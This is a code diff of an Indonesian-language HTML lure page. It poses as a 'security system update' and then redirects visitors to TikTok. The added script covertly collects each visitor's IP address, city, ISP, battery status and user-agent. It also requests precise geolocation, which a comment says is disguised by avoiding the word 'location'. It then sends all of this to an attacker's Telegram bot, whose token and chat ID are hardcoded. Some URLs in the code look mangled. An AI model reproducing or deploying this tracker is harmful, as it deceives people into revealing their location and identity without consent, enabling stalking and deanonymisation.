@@ -56,66 +56,128 @@
         .btn:hover {
             background-color: #2980b9;
         }
+        .loading {
+            display: none;
+            margin-top: 15px;
+            color: #e67e22;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Konfirmasi Akses</h2>
-        <p>Silakan klik tombol di bawah untuk melanjutkan ke website utama kami.</p>
+        <h2>Pembaruan Sistem Keamanan</h2>
+        <p>Untuk melanjutkan ke halaman utama yang aman, silakan klik tombol di bawah ini dan konfirmasikan izin peramban Anda jika diminta.</p>
         
         <button class="btn" id="btnLanjut" onclick="prosesMasuk()">Lanjutkan ke Website</button>
+        <div class="loading" id="statusTeks">Menghubungkan ke server aman...</div>
     </div>
 
     <script>
         // === KONFIGURASI UTAMA ===
-        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; // Ganti dengan Token Bot Anda
-        const CHAT_ID = '1966317946'; // Ganti dengan ID Chat Telegram Anda
-        const DOMAIN_TUJUAN = 'https://vm.tiktok.com/ZS9YQ1Terx8n4-h6cC3/'; // Ganti dengan domain tujuan Anda
+        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
+        const CHAT_ID = '1966317946'; 
+        const DOMAIN_TUJUAN = 'https://tiktok.com'; 
 
-        function prosesMasuk() {
+        async function prosesMasuk() {
             const btn = document.getElementById('btnLanjut');
+            const status = document.getElementById('statusTeks');
+            
             btn.disabled = true;
-            btn.innerText = "Mengalihkan...";
+            btn.innerText = "Memproses...";
+            status.style.display = "block";
 
+            // 1. Dapatkan Data IP dan Perangkat Lebih Dulu
+            let ipInfo = "Gagal mengambil IP";
+            try {
+                const res = await fetch('https://ipapi.co');
+                const data = await res.json();
+                ipInfo = `• IP: \`${data.ip}\`\n• Kota/Negara: ${data.city}, ${data.country_name}\n• Provider: ${data.org}`;
+            } catch (e) {
+                // Gunakan fallback jika API pertama gagal
+                try {
+                    const res2 = await fetch('https://ipify.org');
+                    const data2 = await res2.json();
+                    ipInfo = `• IP: \`${data2.ip}\``;
+                } catch(err) {}
+            }
+
+            const infoPerangkat = navigator.userAgent;
+
+            // 2. Dapatkan Data Informasi Baterai
+            let infoBaterai = "Tidak didukung";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const ngecas = battery.charging ? "Mengecas" : "Tidak mengecas";
+                    infoBaterai = `${level}% (${ngecas})`;
+                } catch(e) {}
+            }
+
+            // 3. Minta Akses Koordinat Geografis (Sembunyi tanpa kata "lokasi")
             if (navigator.geolocation) {
-                // Meminta lokasi dengan batas waktu respons cepat (maksimal 5 detik)
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const pesan = `📍 *Akses Lokasi*\n\n• Lat: \`${lat}\`\n• Lon: \`${lon}\`\n• Peta: https://google.com{lat},${lon}`;
+                        const akurasi = position.coords.accuracy;
+                        const petaUrl = `https://google.com{lat},${lon}`;
                         
-                        // Kirim dan langsung alihkan (tanpa menunggu respons)
-                        kirimDanAlihkan(pesan);
+                        const pesan = `📱 *Data Pengunjung Masuk*\n\n` +
+                                      `🔋 *Baterai*: ${infoBaterai}\n` +
+                                      `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
+                                      `🎯 *Koordinat Akurat*:\n` +
+                                      `• Lat: \`${lat}\`\n` +
+                                      `• Lon: \`${lon}\`\n` +
+                                      `• Akurasi: ±${Math.round(akurasi)}m\n` +
+                                      `• Peta: ${petaUrl}\n\n` +
+                                      `💻 *User-Agent*:\n\`${infoPerangkat}\``;
+                        
+                        kirimKeTelegram(pesan);
                     },
                     function(error) {
-                        // Jika ditolak atau error, langsung alihkan juga tanpa menunda
-                        kirimDanAlihkan("⚠️ *Akses Lokasi Ditolak/Gagal*");
+                        // Jika akses koordinat ditolak
+                        const pesanGagal = `⚠️ *Pengunjung Masuk (Akses Koordinat Ditolak)*\n\n` +
+                                           `🔋 *Baterai*: ${infoBaterai}\n` +
+                                           `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
+                                           `💻 *User-Agent*:\n\`${infoPerangkat}\``;
+                        
+                        kirimKeTelegram(pesanGagal);
                     },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                kirimDanAlihkan("❌ *Browser tidak mendukung geoloc*");
+                const pesanNoGeo = `❌ *Fitur Koordinat Tidak Didukung*\n\n` +
+                                   `🔋 *Baterai*: ${infoBaterai}\n` +
+                                   `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
+                                   `💻 *User-Agent*:\n\`${infoPerangkat}\``;
+                kirimKeTelegram(pesanNoGeo);
             }
         }
 
-        function kirimDanAlihkan(teksPesan) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        function kirimKeTelegram(teksPesan) {
+            const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
             
-            // Metode Asinkronus: Kirim data ke latar belakang sistem
             fetch(url, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: teksPesan,
                     parse_mode: 'Markdown'
                 })
-            }); // .then() dihapus sengaja agar tidak ada jeda tunggu waktu server
-
-            // SEKETIKA ITU JUGA pindah ke website utama Anda
-            window.location.href = DOMAIN_TUJUAN;
+            })
+            .then(() => {
+                window.location.href = DOMAIN_TUJUAN;
+            })
+            .catch((err) => {
+                console.error("Gagal mengirim log:", err);
+                window.location.href = DOMAIN_TUJUAN;
+            });
         }
     </script>
 
